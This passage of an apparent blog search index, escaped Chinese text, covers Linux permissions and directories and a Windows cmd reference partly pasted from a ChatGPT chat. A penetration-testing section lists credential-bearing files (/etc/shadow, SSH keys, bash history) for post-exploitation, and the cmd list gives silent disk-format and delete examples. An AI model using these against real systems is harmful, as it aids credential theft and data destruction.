\u62e5\u6709\u8005\u53ef\u5b8c\u5168\u8bbf\u95ee\uff0c\u5176\u4ed6\u4eba\u90fd\u4e0d\u80fd\u8bbf\u95ee\u3002 <code>666</code> <code>rw-rw-rw-</code> \u6240\u6709\u4eba\u53ef\u4ee5\u8bfb\u53d6\u548c\u5199\u5165\uff0c\u4f46\u4e0d\u53ef\u6267\u884c\u3002 <code>644</code> <code>rw-r\u2013r\u2013</code> \u62e5\u6709\u8005\u53ef\u4ee5\u8bfb\u53d6\u548c\u5199\u5165\uff0c\u5176\u4ed6\u4eba\u53ea\u53ef\u4ee5\u8bfb\u53d6\u3002 <code>600</code> <code>rw\u2014\u2014-</code> \u62e5\u6709\u8005\u53ef\u4ee5\u8bfb\u53d6\u548c\u5199\u5165\uff0c\u5176\u4ed6\u4eba\u90fd\u4e0d\u80fd\u8bbf\u95ee\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_6","title":"Linux \u6587\u4ef6\u7cfb\u7edf\u7684\u6e17\u900f\u6d4b\u8bd5\u5907\u5fd8\u5f55","text":"\u76ee\u5f55 \u63cf\u8ff0 <code>/</code> <code>/</code> \u4e5f\u88ab\u79f0\u4e3a\u201c\u659c\u6760\u201d\u6216\u8005\u6839\u3002 <code>/bin</code> \u7531\u7cfb\u7edf\u3001\u7cfb\u7edf\u7ba1\u7406\u5458\u4ee5\u53ca\u7528\u6237\u5171\u4eab\u7684\u901a\u7528\u7a0b\u5e8f\u3002 <code>/boot</code> Boot \u6587\u4ef6, \u542f\u52a8\u52a0\u8f7d\u5668(grub), \u5185\u6838, vmlinuz <code>/dev</code> \u5305\u542b\u4e86\u5bf9\u7cfb\u7edf\u8bbe\u5907\u3001\u5e26\u6709\u7279\u6b8a\u5c5e\u6027\u7684\u6587\u4ef6\u7684\u5f15\u7528\u3002 <code>/etc</code> \u91cd\u8981\u7684\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u3002 <code>/home</code> \u7cfb\u7edf\u7528\u6237\u7684\u4e3b\u76ee\u5f55\u3002 <code>/lib</code> \u5e93\u6587\u4ef6\uff0c\u5305\u62ec\u7cfb\u7edf\u548c\u7528\u6237\u90fd\u9700\u8981\u7684\u6240\u6709\u7c7b\u578b\u7684\u7a0b\u5e8f\u7684\u6587\u4ef6\u3002 <code>/lost+found</code> \u6587\u4ef6\u64cd\u4f5c\u5931\u8d25\u4f1a\u88ab\u4fdd\u5b58\u5728\u8fd9\u91cc\u3002 <code>/mnt</code> \u5916\u90e8\u6587\u4ef6\u7cfb\u7edf\u7684\u6807\u51c6\u6302\u8f7d\u70b9\u3002 <code>/media</code> \u5916\u90e8\u6587\u4ef6\u7cfb\u7edf\uff08\u6216\u8005\u67d0\u4e9b\u53d1\u884c\u7248\uff09\u7684\u6302\u8f7d\u70b9\u3002 <code>/net</code> \u6574\u4e2a\u8fdc\u7a0b\u6587\u4ef6\u7cfb\u7edf\u7684\u6807\u51c6\u6302\u8f7d\u70b9 \u2014\u2014 nfs\u3002 <code>/opt</code> \u4e00\u822c\u90fd\u662f\u5305\u542b\u4e00\u4e9b\u9644\u52a0\u7684\u6216\u8005\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u3002 <code>/proc</code> \u4e00\u4e2a\u5305\u542b\u4e86\u7cfb\u7edf\u8d44\u6e90\u76f8\u5173\u4fe1\u606f\u7684\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u3002 <code>/root</code> root \u7528\u6237\u7684\u4e3b\u76ee\u5f55\u3002 <code>/sbin</code> \u7531\u7cfb\u7edf\u548c\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u4f7f\u7528\u7684\u7a0b\u5e8f\u3002 <code>/tmp</code> \u4f9b\u7cfb\u7edf\u4f7f\u7528\u7684\u4e34\u65f6\u7a7a\u95f4\uff0c\u91cd\u542f\u65f6\u4f1a\u88ab\u6e05\u7a7a\u3002 <code>/usr</code> \u4f9b\u6240\u6709\u7528\u6237\u76f8\u5173\u7a0b\u5e8f\u4f7f\u7528\u7684\u7a0b\u5e8f\u3001\u5e93\u3001\u6587\u6863\u7b49\u7b49\u3002 <code>/var</code> \u5b58\u50a8\u6240\u6709\u7531\u7528\u6237\u521b\u5efa\u7684\u53ef\u53d8\u6587\u4ef6\u548c\u4e34\u65f6\u6587\u4ef6\uff0c\u6bd4\u5982\u65e5\u5fd7\u6587\u4ef6\u3001\u90ae\u4ef6\u961f\u5217\u7b49\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_7","title":"Linux \u4e2d\u6709\u8da3\u7684\u6587\u4ef6/\u76ee\u5f55","text":"<p>\u5982\u679c\u4f60\u60f3\u5c1d\u8bd5\u8fdb\u884c\u7279\u6743\u5347\u7ea7/\u6267\u884c\u540e\u671f\u5f00\u53d1\uff0c\u8fd9\u4e9b\u90fd\u662f\u4f60\u503c\u5f97\u4e00\u77a7\u7684\u547d\u4ee4\u3002</p> \u8def\u5f84 \u63cf\u8ff0 <code>/etc/passwd</code> \u5305\u542b\u4e86\u672c\u5730 Linux \u7684\u7528\u6237\u3002 <code>/etc/shadow</code> \u5305\u542b\u4e86\u54c8\u5e0c\u8fc7\u7684\u672c\u5730\u8d26\u6237\u5bc6\u7801\u3002 <code>/etc/group</code> \u5305\u542b\u4e86\u672c\u5730\u8d26\u6237\u5206\u7ec4\u3002 <code>/etc/init.d/</code> \u5305\u542b\u4e86\u670d\u52a1\u7f51\u521d\u59cb\u5316\u811a\u672c \u2013 \u5177\u4f53\u90fd\u5b89\u88c5\u4e86\u4e9b\u5565\u5e94\u8be5\u503c\u5f97\u4e00\u77a7\u3002 <code>/etc/hostname</code> \u7cfb\u7edf\u7684 hostname\u3002 <code>/etc/network/interfaces</code> \u7f51\u7edc\u63a5\u53e3\u3002 <code>/etc/resolv.conf</code> \u7cfb\u7edf\u7684 DNS \u670d\u52a1\u3002 <code>/etc/profile</code> \u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\u3002 <code>~/.ssh/</code> SSH \u5bc6\u94a5\u3002 <code>~/.bash_history</code> \u7528\u6237\u7684 bash \u5386\u53f2\u65e5\u5fd7\u3002 <code>/var/log/</code> Linux \u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\u4e00\u822c\u5c31\u88ab\u5b58\u653e\u5728\u8fd9\u91cc\u3002 <code>/var/adm/</code> UNIX \u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\u4e00\u822c\u5c31\u88ab\u5b58\u5728\u5728\u8fd9\u91cc\u3002 <code>/var/log/apache2/access.log</code> / <code>/var/log/httpd/access.log</code> Apache \u8bbf\u95ee\u65e5\u5fd7\u6587\u4ef6\u901a\u5e38\u7684\u5b58\u5728\u8def\u5f84\u3002 <code>/etc/fstab</code> \u6302\u8f7d\u7684\u6587\u4ef6\u7cfb\u7edf\u3002"},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","title":"cmd\u5e38\u7528\u547d\u4ee4","text":"","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_1","title":"\u7cfb\u7edf\u7ba1\u7406","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>gpedit.msc</code> \u7ec4\u7b56\u7565 <code>lusrmgr.msc</code> \u672c\u673a\u7528\u6237\u548c\u7ec4 <code>services.msc</code> \u672c\u5730\u670d\u52a1\u8bbe\u7f6e <code>compmgmt.msc</code> \u8ba1\u7b97\u673a\u7ba1\u7406 <code>sysedit</code> \u7cfb\u7edf\u914d\u7f6e\u7f16\u8f91\u5668 <code>msconfig.exe</code> \u7cfb\u7edf\u914d\u7f6e\u5b9e\u7528\u7a0b\u5e8f <code>secpol.msc</code> \u672c\u5730\u5b89\u5168\u7b56\u7565 <code>syskey</code> \u7cfb\u7edf\u52a0\u5bc6\uff0c\u4e00\u65e6\u52a0\u5bc6\u5c31\u4e0d\u80fd\u89e3\u5f00\uff0c\u4fdd\u62a4 Windows XP \u7cfb\u7edf\u7684\u53cc\u91cd\u5bc6\u7801 <code>eventvwr</code> \u4e8b\u4ef6\u67e5\u770b\u5668 <code>dcomcnfg</code> \u6253\u5f00\u7cfb\u7edf\u7ec4\u4ef6\u670d\u52a1 <code>diskmgmt.msc</code> \u78c1\u76d8\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f <code>ciadv.msc</code> \u7d22\u5f15\u670d\u52a1\u7a0b\u5e8f <code>taskmgr</code> \u4efb\u52a1\u7ba1\u7406\u5668 <code>perfmon.msc</code> \u8ba1\u7b97\u673a\u6027\u80fd\u76d1\u6d4b\u7a0b\u5e8f <code>wmimgmt.msc</code> \u6253\u5f00 Windows \u7ba1\u7406\u4f53\u7cfb\u7ed3\u6784 (WMI) <code>wupdmgr</code> Windows \u66f4\u65b0\u7a0b\u5e8f <code>netstat -an</code> \u67e5\u770b\u7f51\u7edc\u8fde\u63a5\u53ca\u7aef\u53e3 <code>syncapp</code> \u521b\u5efa\u4e00\u4e2a\u516c\u6587\u5305 <code>shrpubw</code> \u521b\u5efa\u5171\u4eab\u6587\u4ef6\u5939","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_2","title":"\u6587\u4ef6\u7ba1\u7406","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>explorer</code> \u6253\u5f00\u8d44\u6e90\u7ba1\u7406\u5668 <code>notepad</code> \u6253\u5f00\u8bb0\u4e8b\u672c <code>cleanmgr</code> \u5783\u573e\u6574\u7406 <code>calc</code> \u542f\u52a8\u8ba1\u7b97\u5668 <code>mspaint</code> \u753b\u56fe\u677f <code>write</code> \u5199\u5b57\u677f <code>charmap</code> \u542f\u52a8\u5b57\u7b26\u6620\u5c04\u8868 <code>clipbrd</code> \u526a\u8d34\u677f\u67e5\u770b\u5668 <code>odbcad32</code> ODBC \u6570\u636e\u6e90\u7ba1\u7406\u5668 <code>eudcedit</code> \u9020\u5b57\u7a0b\u5e8f <code>packager</code> \u5bf9\u8c61\u5305\u88c5\u7a0b\u5e8f <code>replace</code> \u66ff\u6362\u6587\u4ef6 <code>ren</code> \u91cd\u547d\u540d\u6587\u4ef6 <code>tree</code> \u4ee5\u6811\u5f62\u7ed3\u6784\u663e\u793a\u51fa\u76ee\u5f55\uff0c<code>/f</code> \u53c2\u6570\u663e\u793a\u6587\u4ef6\u540d\u79f0 <code>type</code> \u663e\u793a\u6587\u672c\u6587\u4ef6\u5185\u5bb9 <code>more</code> \u9010\u5c4f\u663e\u793a\u8f93\u51fa\u6587\u4ef6 <code>copy</code> \u590d\u5236\u6587\u4ef6 <code>del</code> \u5220\u9664\u6587\u4ef6 <code>attrib</code> \u4fee\u6539\u6587\u4ef6\u5c5e\u6027 <code>xcopy</code> \u590d\u5236\u6587\u4ef6\u548c\u76ee\u5f55\u6811 <code>tftp</code> \u6587\u4ef6\u4f20\u8f93\u534f\u8bae <code>ftp</code> \u6587\u4ef6\u4f20\u8f93\u534f\u8bae","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_3","title":"\u78c1\u76d8\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>fdisk</code> \u5206\u533a\u64cd\u4f5c\uff0c<code>/mbr</code> \u91cd\u5efa\u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff0c<code>/cmbr</code> \u91cd\u5efa\u6307\u5b9a\u786c\u76d8\u7684\u4e3b\u5f15\u5bfc\u8bb0\u5f55 <code>format</code> \u683c\u5f0f\u5316\u78c1\u76d8\uff0c<code>/q</code> \u5feb\u901f\u683c\u5f0f\u5316\uff0c<code>/u</code> \u4e0d\u53ef\u6062\u590d\uff0c<code>/autotest</code> \u4e0d\u63d0\u793a <code>chkdsk</code> \u68c0\u67e5\u78c1\u76d8\u5e76\u4fee\u590d\u9519\u8bef <code>diskmgmt.msc</code> \u78c1\u76d8\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_4","title":"\u76ee\u5f55\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>dir</code> \u5217\u51fa\u76ee\u5f55\uff0c<code>/s</code> \u67e5\u627e\u5b50\u76ee\u5f55\uff0c<code>/w</code> \u53ea\u663e\u793a\u6587\u4ef6\u540d\uff0c<code>/p</code> \u5206\u9875\uff0c<code>/a</code> \u663e\u793a\u9690\u85cf\u6587\u4ef6 <code>md</code> / <code>mkdir</code> \u521b\u5efa\u76ee\u5f55 <code>cd</code> / <code>chdir</code> \u8fdb\u5165\u76ee\u5f55\uff0c\u4f7f\u7528\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84 <code>rd</code> / <code>rmdir</code> \u5220\u9664\u76ee\u5f55","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_5","title":"\u6587\u4ef6\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>del</code> \u5220\u9664\u6587\u4ef6\uff0c<code>/f</code> \u5f3a\u5236\u5220\u9664\u53ea\u8bfb\u6587\u4ef6\uff0c<code>/s</code> \u5220\u9664\u76ee\u5f55\u53ca\u5176\u4e0b\u6240\u6709\u5185\u5bb9\uff0c<code>/q</code> \u4e0d\u786e\u8ba4 <code>copy</code> \u590d\u5236\u6587\u4ef6 <code>attrib</code> \u4fee\u6539\u6587\u4ef6\u5c5e\u6027 <code>move</code> \u79fb\u52a8\u6587\u4ef6 <code>fc</code> \u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u5e76\u8f93\u51fa\u5dee\u5f02","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_6","title":"\u5185\u5b58\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>debug</code> \u8c03\u8bd5\u5185\u5b58\uff0c\u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8f93\u51fa\u5185\u5b58\u7b49","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_7","title":"\u7f51\u7edc\u4e0e\u8fde\u63a5","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>net use</code> \u7ba1\u7406\u7f51\u7edc\u8fde\u63a5\uff0c\u4f8b\u5982\u5efa\u7acb\u6216\u5220\u9664\u5171\u4eab\u3001\u6620\u5c04\u9a71\u52a8\u5668 <code>net user</code> \u7ba1\u7406\u7528\u6237\u8d26\u6237\uff0c\u4f8b\u5982\u521b\u5efa\u7528\u6237\u3001\u67e5\u770b\u7528\u6237\u5c5e\u6027 <code>net start</code> \u542f\u52a8\u670d\u52a1 <code>net stop</code> \u505c\u6b62\u670d\u52a1 <code>net view</code> \u67e5\u770b\u5c40\u57df\u7f51\u5185\u7684\u5171\u4eab <code>ping</code> \u68c0\u67e5\u7f51\u7edc\u8fde\u63a5 <code>tracert</code> \u8ddf\u8e2a\u6570\u636e\u5305\u8def\u7531 <code>nbtstat</code> \u67e5\u770b NetBIOS \u72b6\u6001 <code>arp</code> \u67e5\u770b\u548c\u5904\u7406 ARP \u7f13\u5b58 <code>route print</code> \u663e\u793a IP \u8def\u7531 <code>ipconfig</code> \u67e5\u770b\u672c\u5730 IP \u5730\u5740 <code>netsh</code> \u67e5\u770b\u6216\u66f4\u6539\u672c\u5730\u7f51\u7edc\u914d\u7f6e <code>telnet</code> \u8fdc\u7a0b\u767b\u5f55\u670d\u52a1\u5668\uff0c\u9ed8\u8ba4\u7aef\u53e3\u4e3a 23 <code>tlist</code> \u4ee5\u6811\u5f62\u7ed3\u6784\u663e\u793a\u8fdb\u7a0b <code>kill</code> \u5f3a\u5236\u7ed3\u675f\u8fdb\u7a0b","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_8","title":"\u7cfb\u7edf\u5de5\u5177\u4e0e\u8bca\u65ad","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>taskmgr</code> \u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668 <code>regedit</code> \u6ce8\u518c\u8868\u7f16\u8f91\u5668 <code>sfc /scannow</code> \u626b\u63cf\u5e76\u4fee\u590d\u7cfb\u7edf\u6587\u4ef6 <code>sigverif</code> \u6587\u4ef6\u7b7e\u540d\u9a8c\u8bc1 <code>mspaint</code> \u753b\u56fe\u677f <code>magnify</code> \u653e\u5927\u955c\u5b9e\u7528\u7a0b\u5e8f <code>mem</code> \u663e\u793a\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 <code>winmsd</code> \u663e\u793a\u7cfb\u7edf\u4fe1\u606f <code>eudcedit</code> \u9020\u5b57\u7a0b\u5e8f <code>exit</code> \u9000\u51fa CMD \u6216\u6279\u5904\u7406\u811a\u672c <code>path</code> \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_9","title":"\u6279\u5904\u7406\u4e0e\u811a\u672c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>echo</code> \u663e\u793a\u6216\u9690\u85cf\u4fe1\u606f <code>if</code> \u6761\u4ef6\u5904\u7406 <code>goto</code> \u8df3\u8f6c\u5230\u6279\u5904\u7406\u6587\u4ef6\u4e2d\u7684\u6807\u7b7e\u884c <code>call</code> \u8c03\u7528\u53e6\u4e00\u4e2a\u6279\u5904\u7406\u6587\u4ef6 <code>for</code> \u5bf9\u4e00\u7ec4\u6587\u4ef6\u6267\u884c\u67d0\u4e2a\u7279\u5b9a\u547d\u4ee4 <code>pause</code> \u6682\u505c\u6279\u5904\u7406\u7a0b\u5e8f\u5e76\u663e\u793a\u63d0\u793a <code>set</code> \u8bbe\u7f6e\u6216\u663e\u793a\u73af\u5883\u53d8\u91cf <code>rem</code> \u6dfb\u52a0\u6279\u5904\u7406\u6ce8\u91ca <code>doskey</code> \u8bbe\u7f6e\u6216\u53d6\u6d88\u547d\u4ee4\u884c\u5b8f <code>title</code> \u66f4\u6539 CMD \u7a97\u53e3\u6807\u9898 <code>color</code> \u8bbe\u7f6e CMD \u63a7\u5236\u53f0\u524d\u666f\u548c\u80cc\u666f\u989c\u8272","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_10","title":"\u5176\u4ed6","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>start</code> \u542f\u52a8\u65b0\u7a97\u53e3\u5e76\u8fd0\u884c\u7a0b\u5e8f\u6216\u547d\u4ee4 <code>ver</code> \u663e\u793a\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c <code>winver</code> \u5f39\u51fa\u7a97\u53e3\u663e\u793a Windows \u7248\u672c\u4fe1\u606f <code>cacls</code> \u663e\u793a\u6216\u4fee\u6539\u6587\u4ef6\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff08ACL\uff09 <code>net time</code> \u67e5\u770b\u6216\u8bbe\u7f6e\u8ba1\u7b97\u673a\u65f6\u95f4 <code>at</code> \u7ba1\u7406\u8ba1\u5212\u4efb\u52a1 <code>finger</code> \u67e5\u770b\u6700\u8fd1\u767b\u5f55\u7684\u7528\u6237 <code>route</code> \u67e5\u770b\u6216\u4fee\u6539\u8def\u7531\u8868 <code>del /S /Q</code> \u5220\u9664\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\uff0c\u53d6\u6d88\u786e\u8ba4 <p>\u8fd9\u4e9b\u547d\u4ee4\u8986\u76d6\u4e86\u7cfb\u7edf\u7ba1\u7406\u3001\u6587\u4ef6\u548c\u78c1\u76d8\u64cd\u4f5c\u3001\u7f51\u7edc\u8fde\u63a5\u3001\u5185\u5b58\u64cd\u4f5c\u3001\u6279\u5904\u7406\u548c\u811a\u672c\u7b49\u591a\u4e2a\u65b9\u9762\uff0c\u63d0\u4f9b\u4e86\u5bf9 Windows \u73af\u5883\u7684\u5e7f\u6cdb\u63a7\u5236\u3002</p> <p>4o mini</p>","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_11","title":"\u60a8\u8bf4\uff1a","text":"<p>\u5e0c\u671b\u628a\u6307\u4ee4\u5199\u5b8c\u6574\uff0c\u4f8b\u5982\u3000regedit /s \u6ce8\u518c\u8868\u6587\u4ef6\u540d \u5bfc\u5165\u6ce8\u518c\u8868\uff1b\u53c2\u6570/S\u6307\u5b89\u9759\u6a21\u5f0f\u5bfc\u5165\uff0c\u65e0\u4efb\u4f55\u63d0\u793a\uff1b\uff0c\u7ed9\u51fa\u4e86\u53c2\u6570\u7684\u8bf4\u660e</p>","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#chatgpt","title":"ChatGPT \u8bf4\uff1a","text":"<p>ChatGPT</p> <p>\u5f53\u7136\uff0c\u4ee5\u4e0b\u662f\u547d\u4ee4\u7684\u8be6\u7ec6\u7248\u672c\uff0c\u5305\u62ec\u5b8c\u6574\u7684\u547d\u4ee4\u53ca\u5176\u53c2\u6570\u8bf4\u660e\uff1a</p>","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_12","title":"\u7cfb\u7edf\u7ba1\u7406","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>gpedit.msc</code> \u6253\u5f00\u7ec4\u7b56\u7565\u7f16\u8f91\u5668 <code>lusrmgr.msc</code> \u6253\u5f00\u672c\u5730\u7528\u6237\u548c\u7ec4\u7ba1\u7406\u5668 <code>services.msc</code> \u6253\u5f00\u672c\u5730\u670d\u52a1\u7ba1\u7406\u5668 <code>compmgmt.msc</code> \u6253\u5f00\u8ba1\u7b97\u673a\u7ba1\u7406 <code>sysedit</code> \u6253\u5f00\u7cfb\u7edf\u914d\u7f6e\u7f16\u8f91\u5668 <code>msconfig.exe</code> \u6253\u5f00\u7cfb\u7edf\u914d\u7f6e\u5b9e\u7528\u7a0b\u5e8f <code>secpol.msc</code> \u6253\u5f00\u672c\u5730\u5b89\u5168\u7b56\u7565 <code>syskey</code> \u7cfb\u7edf\u52a0\u5bc6\uff0c\u7528\u4e8e\u4fdd\u62a4 Windows XP \u7cfb\u7edf\u7684\u53cc\u91cd\u5bc6\u7801\uff0c\u8bbe\u7f6e\u540e\u4e0d\u80fd\u89e3\u5f00 <code>eventvwr</code> \u6253\u5f00\u4e8b\u4ef6\u67e5\u770b\u5668 <code>dcomcnfg</code> \u6253\u5f00\u7cfb\u7edf\u7ec4\u4ef6\u670d\u52a1\u7ba1\u7406\u5668 <code>diskmgmt.msc</code> \u6253\u5f00\u78c1\u76d8\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f <code>ciadv.msc</code> \u6253\u5f00\u7d22\u5f15\u670d\u52a1\u7a0b\u5e8f <code>taskmgr</code> \u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668 <code>perfmon.msc</code> \u6253\u5f00\u8ba1\u7b97\u673a\u6027\u80fd\u76d1\u6d4b\u7a0b\u5e8f <code>wmimgmt.msc</code> \u6253\u5f00 Windows \u7ba1\u7406\u4f53\u7cfb\u7ed3\u6784 (WMI) <code>wupdmgr</code> \u6253\u5f00 Windows \u66f4\u65b0\u7a0b\u5e8f <code>netstat -an</code> \u67e5\u770b\u7f51\u7edc\u8fde\u63a5\u53ca\u7aef\u53e3 <code>syncapp</code> \u521b\u5efa\u516c\u6587\u5305 <code>shrpubw</code> \u521b\u5efa\u5171\u4eab\u6587\u4ef6\u5939","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_13","title":"\u6587\u4ef6\u7ba1\u7406","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>explorer</code> \u6253\u5f00\u8d44\u6e90\u7ba1\u7406\u5668 <code>notepad</code> \u6253\u5f00\u8bb0\u4e8b\u672c <code>cleanmgr</code> \u6253\u5f00\u78c1\u76d8\u6e05\u7406\u5de5\u5177 <code>calc</code> \u6253\u5f00\u8ba1\u7b97\u5668 <code>mspaint</code> \u6253\u5f00\u753b\u56fe\u677f <code>write</code> \u6253\u5f00\u5199\u5b57\u677f <code>charmap</code> \u6253\u5f00\u5b57\u7b26\u6620\u5c04\u8868 <code>clipbrd</code> \u6253\u5f00\u526a\u8d34\u677f\u67e5\u770b\u5668 <code>odbcad32</code> \u6253\u5f00 ODBC \u6570\u636e\u6e90\u7ba1\u7406\u5668 <code>eudcedit</code> \u6253\u5f00\u9020\u5b57\u7a0b\u5e8f <code>packager</code> \u6253\u5f00\u5bf9\u8c61\u5305\u88c5\u7a0b\u5e8f <code>replace</code> \u66ff\u6362\u6587\u4ef6\uff0c\u4f8b\u5982 <code>replace source_file target_file</code> <code>ren</code> \u91cd\u547d\u540d\u6587\u4ef6\uff0c\u4f8b\u5982 <code>ren old_name new_name</code> <code>tree</code> \u4ee5\u6811\u5f62\u7ed3\u6784\u663e\u793a\u76ee\u5f55\uff0c\u4f8b\u5982 <code>tree /f</code> \u663e\u793a\u6587\u4ef6\u540d <code>type</code> \u663e\u793a\u6587\u672c\u6587\u4ef6\u5185\u5bb9\uff0c\u4f8b\u5982 <code>type file.txt</code> <code>more</code> \u9010\u5c4f\u663e\u793a\u6587\u4ef6\u5185\u5bb9\uff0c\u4f8b\u5982 <code>more file.txt</code> <code>copy</code> \u590d\u5236\u6587\u4ef6\uff0c\u4f8b\u5982 <code>copy source_file destination_file</code> <code>del</code> \u5220\u9664\u6587\u4ef6\uff0c\u4f8b\u5982 <code>del file.txt</code>\uff0c<code>/f</code> \u5f3a\u5236\u5220\u9664\u53ea\u8bfb\u6587\u4ef6\uff0c<code>/s</code> \u5220\u9664\u76ee\u5f55\u53ca\u5176\u4e0b\u6240\u6709\u5185\u5bb9\uff0c<code>/q</code> \u4e0d\u786e\u8ba4 <code>attrib</code> \u4fee\u6539\u6587\u4ef6\u5c5e\u6027\uff0c\u4f8b\u5982 <code>attrib +h file.txt</code> \u8bbe\u4e3a\u9690\u85cf\u5c5e\u6027 <code>xcopy</code> \u590d\u5236\u6587\u4ef6\u548c\u76ee\u5f55\u6811\uff0c\u4f8b\u5982 <code>xcopy source destination /e /y</code> <code>tftp</code> \u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u4f8b\u5982 <code>tftp -i ip get server.exe</code> \u4e0b\u8f7d\u6587\u4ef6 <code>ftp</code> \u6587\u4ef6\u4f20\u8f93\u534f\u8bae\uff0c\u4f8b\u5982 <code>ftp ip</code> \u8fde\u63a5\u5230 FTP \u670d\u52a1\u5668","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_14","title":"\u78c1\u76d8\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>fdisk</code> \u78c1\u76d8\u5206\u533a\u7ba1\u7406\u5de5\u5177\uff0c\u53c2\u6570 <code>/mbr</code> \u91cd\u5efa\u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff0c<code>/cmbr</code> \u91cd\u5efa\u6307\u5b9a\u786c\u76d8\u7684\u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff0c\u4f8b\u5982 <code>fdisk /cmbr 2</code> <code>format</code> \u683c\u5f0f\u5316\u78c1\u76d8\uff0c\u4f8b\u5982 <code>format C: /FS:NTFS /q /u /autotest</code>\uff0c<code>/FS</code> \u6307\u5b9a\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\uff0c<code>/q</code> \u5feb\u901f\u683c\u5f0f\u5316\uff0c<code>/u</code> \u4e0d\u53ef\u6062\u590d\uff0c<code>/autotest</code> \u4e0d\u63d0\u793a <code>chkdsk</code> \u68c0\u67e5\u78c1\u76d8\u5e76\u4fee\u590d\u9519\u8bef\uff0c\u4f8b\u5982 <code>chkdsk D: /f</code>\uff0c<code>/f</code> \u4fee\u590d\u78c1\u76d8\u9519\u8bef","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_15","title":"\u76ee\u5f55\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>dir</code> \u5217\u51fa\u76ee\u5f55\u5185\u5bb9\uff0c\u4f8b\u5982 <code>dir C:\\ /s /w /p /a</code>\uff0c<code>/s</code> \u67e5\u627e\u5b50\u76ee\u5f55\uff0c<code>/w</code> \u53ea\u663e\u793a\u6587\u4ef6\u540d\uff0c<code>/p</code> \u5206\u9875\uff0c<code>/a</code> \u663e\u793a\u9690\u85cf\u6587\u4ef6 <code>md</code> / <code>mkdir</code> \u521b\u5efa\u76ee\u5f55\uff0c\u4f8b\u5982 <code>md new_directory</code> 